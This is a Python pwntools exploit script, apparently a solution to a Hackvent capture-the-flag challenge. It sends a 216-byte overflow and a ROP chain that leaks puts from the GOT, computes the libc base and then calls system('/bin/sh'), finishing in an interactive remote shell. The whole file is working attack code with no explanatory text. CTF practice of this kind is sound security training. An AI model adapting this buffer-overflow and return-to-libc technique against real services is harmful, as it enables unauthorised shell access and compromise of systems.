from pwn import *
import array
from struct import pack
import sys
 
context(os = 'linux')
 
gadget = pack("<Q", 0x0000000000400803) # pop rdi;ret;
binSh = pack("<Q", 0x7ffff7b9f917) # bin/sh
putsGOT = pack("<Q", 0x0000000000601018) # puts in GOT
addr = pack("<Q", 0x00000000004004b0) # call to puts
main = pack("<Q", 0x00000000004006ca) # main

libc = ELF('libc-2.26.so')
puts_off = libc.symbols['puts'] # offset of puts
bin_sh_off = next(libc.search('/bin/sh'))
system_off = libc.symbols['system']

r = remote("challenges.hackvent.hacking-lab.com",31337)
 
r.recvuntil("[ch01c3]>")
r.sendline("1")
r.recvuntil("[f00d]>")
r.sendline("A"*216 + gadget + putsGOT + addr + main)
r.recvuntil("[ch01c3]>")
r.sendline("2")
r.recvuntil("[+] bye bye\n")
 
puts_got_val = u64(r.recv(6)+"\x00"*2)
 
libc_base = 0
libc_base = puts_got_val - puts_off
print "Found base addres: " + hex(libc_base)
l_b = struct.pack("<Q", libc_base)
r.sendline("1")
r.recvuntil("[f00d]>")
 
bin_sh_real = libc_base + bin_sh_off
system_real = libc_base + system_off
 
print "/bin/sh  = " + hex(bin_sh_real)
print "system   = " + hex(system_real)
r.sendline("A"*216 + gadget + struct.pack("<Q", bin_sh_real) + struct.pack("<Q", system_real) + main)
r.recvuntil("[ch01c3]>")
r.sendline("2")
r.recvuntil("[+] bye bye\n")
r.interactive()
